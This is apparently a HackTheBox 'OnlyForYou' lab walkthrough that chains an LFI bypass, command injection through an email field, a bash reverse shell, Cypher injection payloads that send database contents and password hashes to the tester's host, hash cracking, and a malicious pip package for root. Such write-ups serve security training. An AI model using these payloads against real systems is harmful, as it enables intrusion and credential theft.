# HackTheBox - OnlyForYou

## NMAP

```bash
Nmap scan report for 10.10.11.210
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e883e0a9fd43df38198aaa35438411ec (RSA)
|   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)
|_  256 445f7aa377690a77789b04e09f11db80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 80 (HTTP)

Visiting the webserver, it redirects to `only4you.htb`

<img src="https://i.imgur.com/4IKRAFQ.png"/>

<img src="https://i.imgur.com/fgrurkA.png"/>
After adding the domain name we can acces the site

<img src="https://i.imgur.com/YjEZqbQ.png"/>

The site is just a template, fuzzing for files using `gobuster` doesn't yield anything 

<img src="https://i.imgur.com/MNfgI3l.png"/>

Fuzzing for sub domains reveals that there's a `beta` domain

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://only4you.htb' -H "Host: FUZZ.only4you.htb" --hh 178
```

<img src="https://i.imgur.com/RHrBGlg.png"/>

<img src="https://i.imgur.com/knw4ber.png"/>

From here we can download the source code

<img src="https://i.imgur.com/WCXLVLI.png"/>

Looking at `app.py`  we can spot LFI where it's checking if the file name starts  with `..` or with `../`  

<img src="https://i.imgur.com/Hkcg0vt.png"/>

This can be bypassed by starting the file name with `/`  and reading any local files with in the context of www-data user

```bash
curl -X POST 'http://beta.only4you.htb/download' -d "image=/etc/passwd"
```

<img src="https://i.imgur.com/w68jHvf.png"/>

We can try reading default nginx config file

<img src="https://i.imgur.com/27z1okJ.png"/>

We can read the source code of only4you.htb site

<img src="https://i.imgur.com/CGm1RBW.png"/>

It's using `sendmessage` function from `form.py`

```bash
curl -X POST 'http://beta.only4you.htb/download' -d "image=/var/www/only4you.htb/form.py"
```

<img src="https://i.imgur.com/cw73Iel.png"/>
<img src="https://i.imgur.com/1y8zhpr.png"/>

From this function we can see that it's using subprocess to run `dig txt domain (from the email`, it's using regix to validate the email part 

<img src="https://i.imgur.com/V1y9F6u.png"/>

This can be bypassed by providing the input so that it gets validates the regix and inject the command with `;` so that it runs our injection command with `dig` i.e `dig txt uwu.com; curl 10.10.14.92`

So our email parameter should be like this 

```bash
email=test@uwu.com;curl+10.10.14.92
```

<img src="https://i.imgur.com/KeycUrW.png"/>

<img src="https://i.imgur.com/EQUEle2.png"/>

Getting a shell by creating a sh script on our machine with a bash reverse shell payload, making the server download our script and executing it by piping it to bash

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.92/2222 0>&1
```

<img src="https://i.imgur.com/TSIp1ad.png"/>

Checking the local ports with `ss -tulpn`, there's port 8001 running on which there's a login page

<img src="https://i.imgur.com/Uma2EdZ.png"/>

<img src="https://i.imgur.com/eScx3w1.png"/>

With chisel we can port forward this port 

```bash
chisel client 10.10.14.92:3333 R:localhost:8001

chisel server -p 3333 --reverse
```

<img src="https://i.imgur.com/3dZ3Quw.png"/>

With default credentials, `admin:admin` we can login

<img src="https://i.imgur.com/dTX6NMx.png"/>

## Privilege Escalation (john)

From the dashboard, we can see few tasks and out of these tasks there's one about migrating database to `neo4j` which is a graph database 

<img src="https://i.imgur.com/bL45lJP.png"/>

Checking the `/employees` page we can search for an emplyoee

<img src="https://i.imgur.com/eW5VRxX.png"/>

Since it's using neo4j as from those tasks, it uses cypher query which is a query to retrieve data from graph as neo4j is a graph database 

```bash
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.92/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
```

<img src="https://i.imgur.com/FPuGejB.png"/>

To list the labels from neo4j database

```bash
' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.92/?'+label AS b RETURN b//
```

This query will give us 2 labels or tables in response which is `user` and `employee`

<img src="https://i.imgur.com/btYyZXI.png"/>

Now we need to extract the property or the value from user label

```bash
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.92/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

<img src="https://i.imgur.com/L5kiaS9.png"/>

Cracking these two sha-256 hashes, we'll be able to use john's hash to switch to john user on the machine

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash.txt --format=Raw-SHA256
```

<img src="https://i.imgur.com/kjCqrjN.png"/>

<img src="https://i.imgur.com/xh3ifgY.png"/>

From john, we can run `sudo -l` showing that pip3 can be executed as root user which will download any .tar.gz file from local port 3000 (this can be accessed through port forwarding the same way we did for port 8001, on this port there's an instance of gogs already running which like gitea or github

```bash
chisel client 10.10.14.92:3333 R:localhost:3000
```

<img src="https://i.imgur.com/hTdTNJf.png"/>

From `Explore` we see two users, admin and john, we can use john's creds to login

<img src="https://i.imgur.com/lqy46M1.png"/>

<img src="https://i.imgur.com/1HKovwh.png"/>

<img src="https://i.imgur.com/cgdEtUC.png"/>

Following this article for creating a pip package which will execute setup.py on download where you can execute commands as root user, here we can just make bash a SUID or get a reverse shell 

<img src="https://i.imgur.com/nllN27x.png"/>

<img src="https://i.imgur.com/XbF4CeU.png"/>

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/

After building the pip package, upload it to the `Test` repo

<img src="https://i.imgur.com/UoXaELC.png"/>

Go to the settings and make sure to make the repo public

<img src="https://i.imgur.com/ZpYzBdO.png"/>

Now run the command to download the pip package with sudo

```bash
sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/exploitpy-0.0.1.tar.gz
```

<img src="https://i.imgur.com/DeJoVcb.png"/>

## References

- https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j
- https://pentester.land/blog/conf-notes-cypher-query-injection/
- https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/
